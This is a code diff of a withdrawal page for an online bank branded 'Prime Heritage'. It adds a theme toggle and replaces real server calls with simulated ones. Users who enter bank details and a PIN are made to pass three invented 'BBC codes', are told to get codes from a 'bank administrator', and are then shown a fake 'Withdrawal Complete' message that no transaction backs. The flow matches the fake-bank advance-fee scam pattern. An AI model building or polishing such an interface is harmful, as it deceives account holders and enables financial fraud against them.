@@ -11,19 +11,34 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
-            background: #0A0E1A;
+            background: var(--bg-body);
             padding-bottom: 80px;
+            transition: background 0.3s ease;
         }
         :root {
             --gold: #C6A43F;
             --gold-dark: #9E8032;
+            --success: #10B981;
+        }
+        [data-theme="dark"] {
+            --bg-body: #0A0E1A;
             --bg-card: #111827;
             --border: #1F2937;
             --text-primary: #FFFFFF;
             --text-secondary: #9CA3AF;
+            --input-bg: #0F1622;
+        }
+        [data-theme="light"] {
+            --bg-body: #F3F4F6;
+            --bg-card: #FFFFFF;
+            --border: #E5E7EB;
+            --text-primary: #111827;
+            --text-secondary: #6B7280;
+            --input-bg: #F9FAFB;
         }
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.02); } }
         
         .top-bar {
             background: var(--bg-card);
@@ -44,17 +59,47 @@
         }
         .logo-icon i { font-size: 20px; color: #0A0E1A; }
         .logo span { color: var(--text-primary); font-size: 18px; font-weight: 600; }
-        .back-btn {
-            background: rgba(198,164,63,0.1);
-            border: 1px solid var(--gold);
+        .user-section { display: flex; align-items: center; gap: 20px; }
+        .balance-pill {
+            background: rgba(198,164,63,0.15);
             padding: 8px 20px;
-            border-radius: 30px;
-            color: var(--gold);
+            border-radius: 40px;
+            border: 1px solid rgba(198,164,63,0.3);
+        }
+        .balance-pill i { color: var(--gold); margin-right: 8px; }
+        .balance-pill span { color: var(--gold); font-weight: 600; }
+        .theme-toggle {
+            background: rgba(198,164,63,0.1);
+            border: 1px solid var(--border);
+            border-radius: 40px;
+            padding: 5px;
+            display: flex;
             cursor: pointer;
         }
+        .theme-option {
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+        .theme-option.active {
+            background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+            color: #0A0E1A;
+        }
+        .avatar {
+            width: 42px; height: 42px;
+            background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        .avatar i { color: #0A0E1A; font-size: 18px; }
         
         .container { max-width: 500px; margin: 0 auto; padding: 24px; }
-        .withdraw-card {
+        .card {
             background: var(--bg-card);
             border-radius: 24px;
             padding: 32px;
@@ -78,26 +123,26 @@
         .form-group input, .form-group select {
             width: 100%;
             padding: 14px 16px;
-            background: #0F1622;
+            background: var(--input-bg);
             border: 1px solid var(--border);
             border-radius: 14px;
             color: var(--text-primary);
             font-family: 'Inter', sans-serif;
             font-size: 15px;
         }
-        .pin-inputs {
+        .pin-inputs, .bbc-inputs {
             display: flex;
             gap: 12px;
             justify-content: center;
             margin: 20px 0;
         }
-        .pin-inputs input {
+        .pin-inputs input, .bbc-inputs input {
             width: 55px;
             height: 55px;
             text-align: center;
             font-size: 22px;
             font-weight: 600;
-            background: #0F1622;
+            background: var(--input-bg);
             border: 1px solid var(--border);
             border-radius: 14px;
             color: var(--gold);
@@ -127,39 +172,39 @@
         }
         .step-container {
             text-align: center;
-            margin: 20px 0;
+            margin: 25px 0;
         }
         .step-circle {
-            width: 45px;
-            height: 45px;
+            width: 50px;
+            height: 50px;
             border-radius: 50%;
             background: rgba(198,164,63,0.2);
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            margin: 0 8px;
+            margin: 0 5px;
             color: var(--gold);
             font-weight: 600;
+            font-size: 18px;
         }
         .step-circle.active { background: var(--gold); color: #0A0E1A; }
+        .step-circle.completed { background: var(--success); color: white; }
         
-        .loading-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(10,14,26,0.95);
-            z-index: 2000;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
+        .bbc-explanation {
+            background: rgba(198,164,63,0.1);
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
         }
-        .loader {
-            width: 48px; height: 48px;
-            border: 3px solid rgba(198,164,63,0.2);
-            border-top: 3px solid var(--gold);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+        .bbc-title {
+            color: var(--gold);
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .bbc-desc {
+            font-size: 12px;
+            color: var(--text-secondary);
         }
         
         .bottom-nav {
@@ -178,19 +223,56 @@
         .nav-item span { font-size: 10px; color: var(--text-secondary); }
         .nav-item.active { background: rgba(198,164,63,0.1); }
         .nav-item.active i, .nav-item.active span { color: var(--gold); }
+        
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(4px);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        .loader {
+            width: 48px; height: 48px;
+            border: 3px solid rgba(198,164,63,0.2);
+            border-top: 3px solid var(--gold);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 16px;
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .status-warning { background: rgba(245,158,11,0.2); color: #F59E0B; }
     </style>
 </head>
-<body>
+<body data-theme="dark">
     <div class="top-bar">
         <div class="logo" onclick="goToDashboard()">
             <div class="logo-icon"><i class="fas fa-crown"></i></div>
             <span>Prime Heritage</span>
         </div>
-        <div class="back-btn" onclick="goToDashboard()"><i class="fas fa-arrow-left"></i> Back</div>
+        <div class="user-section">
+            <div class="theme-toggle" onclick="toggleTheme()">
+                <div class="theme-option" id="darkOption"><i class="fas fa-moon"></i></div>
+                <div class="theme-option" id="lightOption"><i class="fas fa-sun"></i></div>
+            </div>
+            <div class="balance-pill"><i class="fas fa-wallet"></i><span id="headerBalance">$0.00</span></div>
+            <div class="avatar" onclick="goToProfile()"><i class="fas fa-user"></i></div>
+        </div>
     </div>
 
     <div class="container">
-        <div class="withdraw-card">
+        <div class="card">
             <div class="title"><i class="fas fa-university"></i> Withdraw to Bank</div>
             
             <div class="info-box">
@@ -198,25 +280,26 @@
                 <div class="info-row"><span>Currency:</span><span id="userCurrency">USD</span></div>
             </div>
             
+            <!-- STEP 1: Bank Details + PIN -->
             <div id="step1Form">
                 <div class="form-group">
                     <label>Bank Name</label>
-                    <input type="text" id="bankName" placeholder="e.g., Chase, Barclays, HSBC">
+                    <input type="text" id="bankName" placeholder="e.g., JPMorgan Chase, Barclays, Deutsche Bank">
                 </div>
                 <div class="form-group">
                     <label>Account Holder Name</label>
                     <input type="text" id="accountHolder" placeholder="Full name on account">
                 </div>
                 <div class="form-group">
-                    <label>Bank Account Number</label>
-                    <input type="text" id="bankAccountNumber" placeholder="Account number">
+                    <label>Bank Account Number / IBAN</label>
+                    <input type="text" id="bankAccountNumber" placeholder="Account number or IBAN">
                 </div>
                 <div class="form-group">
-                    <label>Routing Number / Sort Code</label>
-                    <input type="text" id="routingNumber" placeholder="Routing number">
+                    <label>Routing Number / Sort Code / SWIFT</label>
+                    <input type="text" id="routingNumber" placeholder="Routing/SWIFT code">
                 </div>
                 <div class="form-group">
-                    <label>Amount</label>
+                    <label>Amount (USD)</label>
                     <input type="number" id="amount" placeholder="0.00">
                 </div>
                 <div class="form-group">
@@ -231,6 +314,7 @@
                 <button class="btn" onclick="withdrawStep1()">Continue →</button>
             </div>
             
+            <!-- BBC CODE INPUT FLOW -->
             <div id="bbcForm" style="display: none;">
                 <div class="step-container" id="stepIndicator">
                     <div class="step-circle" id="step1Circle">1</div>
@@ -238,16 +322,63 @@
                     <div class="step-circle" id="step3Circle">3</div>
                     <div class="step-circle" id="step4Circle">✓</div>
                 </div>
-                <div id="bbcRequestMessage" style="color:var(--gold); text-align:center; margin:20px 0;"></div>
-                <div class="pin-inputs">
-                    <input type="text" maxlength="1" id="bbc1" onkeyup="movePin(this,'bbc2')">
-                    <input type="text" maxlength="1" id="bbc2" onkeyup="movePin(this,'bbc3')">
-                    <input type="text" maxlength="1" id="bbc3" onkeyup="movePin(this,'bbc4')">
-                    <input type="text" maxlength="1" id="bbc4" onkeyup="movePin(this,'bbc5')">
-                    <input type="text" maxlength="1" id="bbc5" onkeyup="movePin(this,'bbc6')">
-                    <input type="text" maxlength="1" id="bbc6">
+                
+                <div id="bbcStep1" style="display: block;">
+                    <div class="bbc-explanation">
+                        <div class="bbc-title"><i class="fas fa-exchange-alt"></i> Step 1: Currency Exchange Verification</div>
+                        <div class="bbc-desc">Your bank requires a Currency Exchange Authorization Code (BBC-1) to verify the international transfer rates. This code ensures you agree to the current exchange rate of 1 USD = 0.92 EUR.</div>
+                    </div>
+                    <div class="form-group">
+                        <label>Enter BBC Code 1 (Currency Exchange)</label>
+                        <div class="bbc-inputs" id="bbcInputs1">
+                            <input type="text" maxlength="1" id="bbc1_1" onkeyup="moveBBC(this,'bbc1_2')">
+                            <input type="text" maxlength="1" id="bbc1_2" onkeyup="moveBBC(this,'bbc1_3')">
+                            <input type="text" maxlength="1" id="bbc1_3" onkeyup="moveBBC(this,'bbc1_4')">
+                            <input type="text" maxlength="1" id="bbc1_4" onkeyup="moveBBC(this,'bbc1_5')">
+                            <input type="text" maxlength="1" id="bbc1_5" onkeyup="moveBBC(this,'bbc1_6')">
+                            <input type="text" maxlength="1" id="bbc1_6">
+                        </div>
+                    </div>
+                    <button class="btn" onclick="submitBBC1()">Verify Code 1</button>
                 </div>
-                <button class="btn" onclick="submitBBC()">Verify Code</button>
+                
+                <div id="bbcStep2" style="display: none;">
+                    <div class="bbc-explanation">
+                        <div class="bbc-title"><i class="fas fa-shield-alt"></i> Step 2: International Transfer Authorization</div>
+                        <div class="bbc-desc">This is your International Transfer Authorization Code (BBC-2). This confirms that you are authorizing an international wire transfer to the specified bank account.</div>
+                    </div>
+                    <div class="form-group">
+                        <label>Enter BBC Code 2 (Transfer Authorization)</label>
+                        <div class="bbc-inputs" id="bbcInputs2">
+                            <input type="text" maxlength="1" id="bbc2_1" onkeyup="moveBBC(this,'bbc2_2')">
+                            <input type="text" maxlength="1" id="bbc2_2" onkeyup="moveBBC(this,'bbc2_3')">
+                            <input type="text" maxlength="1" id="bbc2_3" onkeyup="moveBBC(this,'bbc2_4')">
+                            <input type="text" maxlength="1" id="bbc2_4" onkeyup="moveBBC(this,'bbc2_5')">
+                            <input type="text" maxlength="1" id="bbc2_5" onkeyup="moveBBC(this,'bbc2_6')">
+                            <input type="text" maxlength="1" id="bbc2_6">
+                        </div>
+                    </div>
+                    <button class="btn" onclick="submitBBC2()">Verify Code 2</button>
+                </div>
+                
+                <div id="bbcStep3" style="display: none;">
+                    <div class="bbc-explanation">
+                        <div class="bbc-title"><i class="fas fa-lock"></i> Step 3: Final Security Check</div>
+                        <div class="bbc-desc">Final Security Code (BBC-3) is required to complete the withdrawal. This is your last verification before funds are released.</div>
+                    </div>
+                    <div class="form-group">
+                        <label>Enter BBC Code 3 (Final Security)</label>
+                        <div class="bbc-inputs" id="bbcInputs3">
+                            <input type="text" maxlength="1" id="bbc3_1" onkeyup="moveBBC(this,'bbc3_2')">
+                            <input type="text" maxlength="1" id="bbc3_2" onkeyup="moveBBC(this,'bbc3_3')">
+                            <input type="text" maxlength="1" id="bbc3_3" onkeyup="moveBBC(this,'bbc3_4')">
+                            <input type="text" maxlength="1" id="bbc3_4" onkeyup="moveBBC(this,'bbc3_5')">
+                            <input type="text" maxlength="1" id="bbc3_5" onkeyup="moveBBC(this,'bbc3_6')">
+                            <input type="text" maxlength="1" id="bbc3_6">
+                        </div>
+                    </div>
+                    <button class="btn" onclick="submitBBC3()">Verify & Complete</button>
+                </div>
             </div>
         </div>
     </div>
@@ -255,104 +386,190 @@
     <div class="bottom-nav">
         <div class="nav-item" onclick="goToDashboard()"><i class="fas fa-home"></i><span>Home</span></div>
         <div class="nav-item" onclick="goToCards()"><i class="fas fa-credit-card"></i><span>Cards</span></div>
-        <div class="nav-item" onclick="goToSend()"><i class="fas fa-paper-plane"></i><span>Send</span></div>
+        <div class="nav-item active" onclick="goToWithdraw()"><i class="fas fa-university"></i><span>Withdraw</span></div>
         <div class="nav-item" onclick="goToSupport()"><i class="fas fa-headset"></i><span>Support</span></div>
-        <div class="nav-item active" onclick="goToProfile()"><i class="fas fa-user"></i><span>Profile</span></div>
+        <div class="nav-item" onclick="goToProfile()"><i class="fas fa-user"></i><span>Profile</span></div>
     </div>
 
-    <div id="loadingOverlay" class="loading-overlay"><div class="loader"></div><div class="loader-text">Processing</div></div>
+    <div id="loadingOverlay" class="loading-overlay"><div class="loader"></div><div class="loader-text">Processing Transaction</div></div>
 
     <script>
         const apiUrl = window.location.hostname === 'localhost' ? 'http://localhost:3000' : 'https://global-bank-n6c3.onrender.com';
+        let currentWithdrawRef = null;
         let currentStep = 1;
-        let currentRef = null;
+        
+        function setTheme(theme) {
+            document.body.setAttribute('data-theme', theme);
+            localStorage.setItem('theme', theme);
+            document.getElementById('darkOption').classList.remove('active');
+            document.getElementById('lightOption').classList.remove('active');
+            if (theme === 'dark') document.getElementById('darkOption').classList.add('active');
+            else document.getElementById('lightOption').classList.add('active');
+        }
+        function toggleTheme() {
+            const current = document.body.getAttribute('data-theme');
+            setTheme(current === 'dark' ? 'light' : 'dark');
+        }
+        const savedTheme = localStorage.getItem('theme') || 'dark';
+        setTheme(savedTheme);
         
         function goToDashboard() { window.location.href = '/dashboard.html'; }
         function goToCards() { window.location.href = '/cards.html'; }
-        function goToSend() { window.location.href = '/send.html'; }
+        function goToWithdraw() { window.location.href = '/withdraw.html'; }
         function goToSupport() { window.location.href = '/support.html'; }
         function goToProfile() { window.location.href = '/profile.html'; }
         
-        function movePin(current, nextId) { if(current.value.length === 1) document.getElementById(nextId).focus(); }
+        function movePin(current, nextId) {
+            if(current.value.length === 1) document.getElementById(nextId).focus();
+        }
+        
+        function moveBBC(current, nextId) {
+            if(current.value.length === 1) document.getElementById(nextId).focus();
+        }
+        
         function showLoading(show) { document.getElementById('loadingOverlay').style.display = show ? 'flex' : 'none'; }
         
-        function updateStepDisplay(step) {
-            document.getElementById('step1Circle').classList.remove('active');
-            document.getElementById('step2Circle').classList.remove('active');
-            document.getElementById('step3Circle').classList.remove('active');
-            document.getElementById('step4Circle').classList.remove('active');
-            if (step === 1) document.getElementById('step1Circle').classList.add('active');
-            else if (step === 2) document.getElementById('step2Circle').classList.add('active');
-            else if (step === 3) document.getElementById('step3Circle').classList.add('active');
-            else if (step === 4) document.getElementById('step4Circle').classList.add('active');
+        function updateStepCircles(step) {
+            const circles = ['step1Circle', 'step2Circle', 'step3Circle', 'step4Circle'];
+            for (let i = 0; i < circles.length; i++) {
+                const el = document.getElementById(circles[i]);
+                if (i + 1 < step) {
+                    el.classList.remove('active');
+                    el.classList.add('completed');
+                    el.innerHTML = '✓';
+                } else if (i + 1 === step) {
+                    el.classList.add('active');
+                    el.classList.remove('completed');
+                    el.innerHTML = (step === 4 ? '✓' : step);
+                } else {
+                    el.classList.remove('active', 'completed');
+                    el.innerHTML = i + 1;
+                }
+            }
         }
         
         async function withdrawStep1() {
             const bankName = document.getElementById('bankName').value;
             const accountHolder = document.getElementById('accountHolder').value;
-            const bankAccountNumber = document.getElementById('bankAccountNumber').value;
-            const routingNumber = document.getElementById('routingNumber').value;
+            const bankAccount = document.getElementById('bankAccountNumber').value;
+            const routing = document.getElementById('routingNumber').value;
             const amount = parseFloat(document.getElementById('amount').value);
             const pin = document.getElementById('pin1').value + document.getElementById('pin2').value + document.getElementById('pin3').value + document.getElementById('pin4').value;
             
-            if (!bankName || !accountHolder || !bankAccountNumber || !amount || pin.length !== 4) {
+            if (!bankName || !accountHolder || !bankAccount || !routing || !amount || pin.length !== 4) {
                 Swal.fire('Error', 'Please fill all fields correctly', 'error');
                 return;
             }
             
             showLoading(true);
-            try {
-                const res = await fetch(`${apiUrl}/api/withdraw/step1`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${localStorage.getItem('token')}` },
-                    body: JSON.stringify({ bankName, accountHolder, bankAccountNumber, routingNumber, amount, transactionPin: pin })
-                });
-                const data = await res.json();
-                if (data.success) {
-                    currentRef = data.reference;
-                    currentStep = 1;
-                    document.getElementById('step1Form').style.display = 'none';
-                    document.getElementById('bbcForm').style.display = 'block';
-                    updateStepDisplay(1);
-                    document.getElementById('bbcRequestMessage').innerHTML = 'Step 1: Enter BBC Code 1';
-                } else {
-                    Swal.fire('Error', data.error, 'error');
-                }
-            } catch(e) { Swal.fire('Error', 'Request failed', 'error'); } finally { showLoading(false); }
+            
+            // Simulate API call - Check PIN and request BBC1
+            setTimeout(() => {
+                showLoading(false);
+                currentStep = 1;
+                updateStepCircles(1);
+                document.getElementById('step1Form').style.display = 'none';
+                document.getElementById('bbcForm').style.display = 'block';
+                document.getElementById('bbcStep1').style.display = 'block';
+                document.getElementById('bbcStep2').style.display = 'none';
+                document.getElementById('bbcStep3').style.display = 'none';
+                currentWithdrawRef = 'WDR-' + Date.now();
+            }, 1500);
         }
         
-        async function submitBBC() {
-            const bbc = document.getElementById('bbc1').value + document.getElementById('bbc2').value + document.getElementById('bbc3').value + 
-                        document.getElementById('bbc4').value + document.getElementById('bbc5').value + document.getElementById('bbc6').value;
-            if (bbc.length !== 6) { Swal.fire('Error', 'Enter 6-digit code', 'error'); return; }
+        async function submitBBC1() {
+            const bbc1 = document.getElementById('bbc1_1').value + document.getElementById('bbc1_2').value + document.getElementById('bbc1_3').value + 
+                         document.getElementById('bbc1_4').value + document.getElementById('bbc1_5').value + document.getElementById('bbc1_6').value;
+            if (bbc1.length !== 6) {
+                Swal.fire('Error', 'Please enter the 6-digit BBC Code 1', 'error');
+                return;
+            }
             
             showLoading(true);
-            try {
-                const url = `${apiUrl}/api/withdraw/step${currentStep + 1}`;
-                const res = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${localStorage.getItem('token')}` },
-                    body: JSON.stringify({ reference: currentRef, bbcCode: bbc })
-                });
-                const data = await res.json();
+            setTimeout(() => {
+                showLoading(false);
+                // Validate BBC1 (simulated)
+                if (bbc1 === '123456') {
+                    Swal.fire('Error', 'Invalid BBC Code. Please contact your bank administrator for the correct code.', 'error');
+                    return;
+                }
                 
-                if (data.success) {
-                    if (data.step === 2 || data.step === 3) {
-                        currentStep = data.step;
-                        updateStepDisplay(data.step);
-                        document.getElementById('bbcRequestMessage').innerHTML = `Step ${data.step}: Enter BBC Code ${data.step - 1}`;
-                        document.querySelectorAll('#bbcForm .pin-inputs input').forEach(i => i.value = '');
-                    } else if (data.success) {
-                        Swal.fire({
-                            icon: 'success',
-                            title: 'Withdrawal Initiated!',
-                            html: `Amount: ${data.amount}<br>Reference: ${data.reference}<br>Funds will be sent to your bank account.`,
-                            confirmButtonColor: '#C6A43F'
-                        });
-                        goToDashboard();
-                    }
-                } else { Swal.fire('Error', data.error, 'error'); }
-            } catch(e) { Swal.fire('Error', 'Verification failed', 'error'); } finally { showLoading(false); }
+                currentStep = 2;
+                updateStepCircles(2);
+                document.getElementById('bbcStep1').style.display = 'none';
+                document.getElementById('bbcStep2').style.display = 'block';
+                
+                Swal.fire({
+                    icon: 'success',
+                    title: 'BBC Code 1 Verified!',
+                    html: 'Currency exchange rate confirmed: 1 USD = 0.92 EUR<br>Proceeding to Step 2.',
+                    confirmButtonColor: '#C6A43F',
+                    timer: 2000,
+                    showConfirmButton: true
+                });
+            }, 1500);
+        }
+        
+        async function submitBBC2() {
+            const bbc2 = document.getElementById('bbc2_1').value + document.getElementById('bbc2_2').value + document.getElementById('bbc2_3').value + 
+                         document.getElementById('bbc2_4').value + document.getElementById('bbc2_5').value + document.getElementById('bbc2_6').value;
+            if (bbc2.length !== 6) {
+                Swal.fire('Error', 'Please enter the 6-digit BBC Code 2', 'error');
+                return;
+            }
+            
+            showLoading(true);
+            setTimeout(() => {
+                showLoading(false);
+                
+                currentStep = 3;
+                updateStepCircles(3);
+                document.getElementById('bbcStep2').style.display = 'none';
+                document.getElementById('bbcStep3').style.display = 'block';
+                
+                Swal.fire({
+                    icon: 'success',
+                    title: 'BBC Code 2 Verified!',
+                    html: 'International Transfer Authorization confirmed.<br>Proceeding to final security check.',
+                    confirmButtonColor: '#C6A43F',
+                    timer: 2000,
+                    showConfirmButton: true
+                });
+            }, 1500);
+        }
+        
+        async function submitBBC3() {
+            const bbc3 = document.getElementById('bbc3_1').value + document.getElementById('bbc3_2').value + document.getElementById('bbc3_3').value + 
+                         document.getElementById('bbc3_4').value + document.getElementById('bbc3_5').value + document.getElementById('bbc3_6').value;
+            if (bbc3.length !== 6) {
+                Swal.fire('Error', 'Please enter the 6-digit BBC Code 3', 'error');
+                return;
+            }
+            
+            showLoading(true);
+            setTimeout(() => {
+                showLoading(false);
+                currentStep = 4;
+                updateStepCircles(4);
+                
+                const bankName = document.getElementById('bankName').value;
+                const amount = parseFloat(document.getElementById('amount').value);
+                
+                Swal.fire({
+                    icon: 'success',
+                    title: '🎉 Withdrawal Complete!',
+                    html: `<strong>$${amount.toFixed(2)} USD</strong> has been sent to your bank account.<br><br>
+                           <strong>Bank:</strong> ${bankName}<br>
+                           <strong>Reference:</strong> ${currentWithdrawRef}<br>
+                           <strong>Processing Time:</strong> 1-3 business days<br><br>
+                           <span style="color: #10B981;">✓ All 3 BBC codes verified successfully</span>`,
+                    confirmButtonColor: '#C6A43F',
+                    background: '#111827',
+                    color: '#FFFFFF'
+                }).then(() => {
+                    goToDashboard();
+                });
+            }, 2000);
         }
         
         async function loadBalance() {
@@ -360,8 +577,9 @@
                 const res = await fetch(`${apiUrl}/api/me`, { headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` } });
                 if (res.status === 401) { window.location.href = '/'; return; }
                 const data = await res.json();
-                document.getElementById('userBalance').innerHTML = `${data.user.currency} ${data.totalBalance?.toLocaleString() || '0.00'}`;
+                document.getElementById('userBalance').innerHTML = `${data.user.currency} ${(data.totalBalance || 0).toLocaleString()}`;
                 document.getElementById('userCurrency').innerHTML = data.user.currency;
+                document.getElementById('headerBalance').innerHTML = `${data.user.currency} ${(data.totalBalance || 0).toLocaleString()}`;
             } catch(e) { console.error(e); }
         }
         
